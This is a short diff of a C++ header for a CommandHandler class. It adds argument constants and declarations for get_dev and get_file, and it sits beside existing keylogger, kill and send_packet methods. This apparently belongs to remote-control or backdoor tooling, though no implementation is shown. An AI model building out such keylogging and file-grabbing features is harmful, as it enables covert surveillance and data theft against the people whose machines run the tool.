@@ -34,10 +34,15 @@
 #define KILL_ARG 4
 #define VERBOSITY_ARG 5
 #define REMOVE_ARG 6
+#define DEV_ARG 7
+#define OUT_ARG 8
+#define FILE_NAME_ARG 9
 
 #define ARG_TYPE_INT 0x1A
 #define ARG_TYPE_STRING 0x1B
 #define ARG_TYPE_SET 0x1C
+
+#define MAX_COMMAND_LEN 256 + (PATH_MAX * 2)
 
 class CommandHandler;
 
@@ -104,6 +109,8 @@ private:
     void show_verbosity();
     void kill();
     void keylogger();
+    void get_dev();
+    void get_file();
 
     uint find_open_port();
     void send_packet(uint16_t __packet, int __client_index);    
